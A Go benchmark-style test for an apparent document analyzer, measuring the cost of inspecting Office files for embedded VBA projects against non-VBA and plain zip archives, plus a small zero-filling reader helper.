// TestOOXMLCost reports, through testing.Benchmark, what the embedded-VBA
// inspection adds: a .xlsm with a VBA project against the same document
// without one, and a plain source zip of the same member count. Run with
// -v to see the numbers.
func TestOOXMLCost(t *testing.T) {
	if testing.Short() {
		t.Skip("benchmark-style measurement")
	}
	xlsm := buildZip(t, append(officeDoc("xl"), zipEntry{"xl/vbaProject.bin", vbaMalicious()}))
	xlsx := buildZip(t, append(officeDoc("xl"), zipEntry{"xl/styles.xml", []byte("<styles/>")}))
	// The same members with [Content_Types].xml renamed: identical peeks,
	// never recognised as a document.
	unrec := buildZip(t, append(officeDoc("xl")[1:], zipEntry{"Content-Types.xml", []byte(contentTypesXML)}, zipEntry{"xl/styles.xml", []byte("<styles/>")}))
	plain := buildZip(t, []zipEntry{
		{"a/main.go", []byte("package a")}, {"README", []byte("x")}, {"b.csv", []byte("1,2")},
		{"c.txt", []byte("c")}, {"d.json", []byte("{}")},
	})
	run := func(name string, data []byte) {
		res := testing.Benchmark(func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				Analyze(data, Options{})
			}
		})
		t.Logf("%-28s %8d ns/op  %7d B/op  %4d allocs/op  (%d bytes in)", name, res.NsPerOp(), res.AllocedBytesPerOp(), res.AllocsPerOp(), len(data))
	}
	run("xlsm with vbaProject.bin", xlsm)
	run("xlsx, no VBA", xlsx)
	run("same members, not OOXML", unrec)
	run("plain zip, 5 members", plain)
}

// zeroReader yields zeros without allocating them.
type zeroReader struct{}

func (zeroReader) Read(p []byte) (int, error) {
	for i := range p {
		p[i] = 0
	}
	return len(p), nil
}
